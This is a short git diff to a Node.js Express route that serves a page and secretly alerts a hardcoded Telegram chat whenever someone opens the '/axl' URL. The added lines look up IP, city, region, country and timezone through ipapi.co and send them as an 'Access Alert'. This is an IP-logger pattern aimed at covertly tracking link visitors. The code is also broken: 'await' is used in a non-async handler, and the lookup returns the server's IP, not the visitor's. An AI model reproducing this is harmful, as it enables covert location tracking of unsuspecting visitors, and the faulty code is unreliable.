@@ -58,8 +58,28 @@ const ajsal = '6524787237';
 app.get('/axl', (req, res) => {
     
 
+
+   const axios = require('axios');
+
+    
+        const ipInfoResponse = await axios.get('https://ipapi.co/json/');
+        const ipInfo = ipInfoResponse.data;
+
+        
+        const ipmsgg = `
+🚨 *Access Alert*:
+- 📱 *Device*: Areela🙂
+- 🌐 *IP*: ${ipInfo.ip || 'N/A'}
+- 📍 *Location*: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country_name}
+- 🕒 *TimeZone*: ${ipInfo.timezone}
+        `;
+
+
+
+
+
     // Send a message to your Telegram ID with the detected device name
-    bot.sendMessage(ajsal, `Someone accessed the  URL using 💀💀`);
+    bot.sendMessage(ajsal, ipmsgg);
 
     res.sendFile(path.join(__dirname, 'index.html'));
 });
